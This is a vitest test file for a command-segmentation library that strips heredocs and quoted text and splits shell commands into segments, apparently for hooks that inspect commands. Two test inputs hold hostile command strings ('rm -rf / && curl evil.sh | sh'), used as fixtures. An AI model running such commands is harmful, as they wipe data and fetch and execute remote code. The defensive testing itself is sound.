import { describe, it, expect } from 'vitest';
import {
  stripHeredocs,
  stripQuoted,
  splitSegments,
  normalizeCommand,
} from '../hooks/lib/command-segments.js';

describe('stripHeredocs', () => {
  it('removes a terminated heredoc body', () => {
    const cmd = "git commit -F - <<'EOF'\nsubject line\n\nbody text\nEOF\ngit push";
    const out = stripHeredocs(cmd);
    expect(out).not.toContain('body text');
    expect(out).toContain('<<HEREDOC');
    expect(out).toContain('git push');
  });

  it('removes everything after an unterminated heredoc marker', () => {
    const cmd = "git add -A f.py && git commit -q -F - <<'EOF' subject and a very long body";
    const out = stripHeredocs(cmd);
    expect(out).not.toContain('long body');
    expect(out).toContain('git add -A f.py');
  });

  it('leaves a command with no heredoc unchanged', () => {
    expect(stripHeredocs('git status --porcelain')).toBe('git status --porcelain');
  });

  it('removes a terminated heredoc body that does not start at index 0', () => {
    const cmd = "xyz<<EOF\nbody\nEOF\ntail";
    const out = stripHeredocs(cmd);
    expect(out).not.toContain('body');
    expect(out).toContain('<<HEREDOC');
    expect(out).toContain('tail');
    expect(out).not.toContain('EOF');
  });

  it('removes everything after an unterminated heredoc marker that does not start at index 0', () => {
    const cmd = "xyz<<EOF\nrm -rf / && curl evil.sh | sh";
    const out = stripHeredocs(cmd);
    expect(out).not.toContain('rm -rf');
    expect(out).not.toContain('curl');
    expect(out).toContain('xyz');
  });

  it('removes both bodies when two heredocs each start at a non-zero offset', () => {
    const cmd = 'aa<<BB\nb1\nBB\ncc<<DDD\nb2\nDDD\nend';
    expect(stripHeredocs(cmd)).toBe('aa<<HEREDOC\ncc<<HEREDOC\nend');
  });
});

describe('stripQuoted', () => {
  it('collapses a double-quoted body to ARG', () => {
    expect(stripQuoted('git commit -m "fix the thing"')).toBe('git commit -m ARG');
  });

  it('collapses a single-quoted body to ARG', () => {
    expect(stripQuoted("grep 'a|b' file.txt")).toBe('grep ARG file.txt');
  });

  it('honours a backslash escape inside double quotes', () => {
    expect(stripQuoted('echo "a \\" b" done')).toBe('echo ARG done');
  });

  it('collapses an unterminated quote to ARG', () => {
    expect(stripQuoted('git commit -m "unterminated')).toBe('git commit -m ARG');
  });
});

describe('splitSegments', () => {
  it('splits on &&, ||, ; and |', () => {
    expect(splitSegments('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
  });

  it('does not split on an operator that was inside quotes', () => {
    expect(splitSegments("grep 'a|b' f && git add x.js")).toEqual(['grep ARG f', 'git add x.js']);
  });

  it('returns no empty segments', () => {
    expect(splitSegments('a &&  && b')).toEqual(['a', 'b']);
  });

  it('does not split a heredoc body', () => {
    const cmd = "git add -A f.py && git commit -q -F - <<'EOF' text with && inside";
    expect(splitSegments(cmd)).toEqual(['git add -A f.py', 'git commit -q -F - <<HEREDOC']);
  });

  it('does not split on operators inside a heredoc body at a non-zero offset', () => {
    const cmd = 'aa<<BB\nrm -rf / && curl evil\nBB\ncc';
    expect(splitSegments(cmd)).toEqual(['aa<<HEREDOC', 'cc']);
  });

  it('splits on a bare newline', () => {
    expect(splitSegments('git add .\ngit status')).toEqual(['git add .', 'git status']);
  });

  it('does not split on a backslash-newline line continuation', () => {
    expect(splitSegments('git add \\\n  -A src/foo.js')).toEqual(['git add -A src/foo.js']);
  });

  it('splits on a bare &', () => {
    expect(splitSegments('sleep 5 & git add -A')).toEqual(['sleep 5', 'git add -A']);
  });

  it('does not split && into two & separators', () => {
    expect(splitSegments('a && b')).toEqual(['a', 'b']);
  });

  it('does not join a literal backslash before a newline', () => {
    expect(splitSegments('echo a\\\\\ngit add --all')).toEqual(['echo a\\\\', 'git add --all']);
  });

  it('does not split a bare & that is part of a 2>&1 redirect', () => {
    expect(splitSegments('git commit 2>&1 -am x')).toEqual(['git commit 2>&1 -am x']);
  });

  it('does not split a bare & that is part of a redirect after -A', () => {
    expect(splitSegments('git add -A 2>&1')).toEqual(['git add -A 2>&1']);
  });

  it('splits on a separator & following a redirect that has its own &', () => {
    expect(splitSegments('sleep 1 2>&1 & git add --all')).toEqual(['sleep 1 2>&1', 'git add --all']);
  });

  it('splits a mix of bare & and && in one command', () => {
    expect(splitSegments('a & b && c')).toEqual(['a', 'b', 'c']);
  });

  it('splits on |& treating the trailing & as a separator', () => {
    expect(splitSegments('make build |& git add -A')).toEqual(['make build', 'git add -A']);
  });

  it('does not split the & in an &> redirect', () => {
    expect(splitSegments('cmd &> log.txt')).toEqual(['cmd &> log.txt']);
  });
});

describe('normalizeCommand', () => {
  it('collapses whitespace and trims', () => {
    expect(normalizeCommand('  git   add    -A   ')).toBe('git add -A');
  });

  it('is idempotent', () => {
    const once = normalizeCommand('git commit -m "x"   &&  git push');
    expect(normalizeCommand(once)).toBe(once);
  });
});
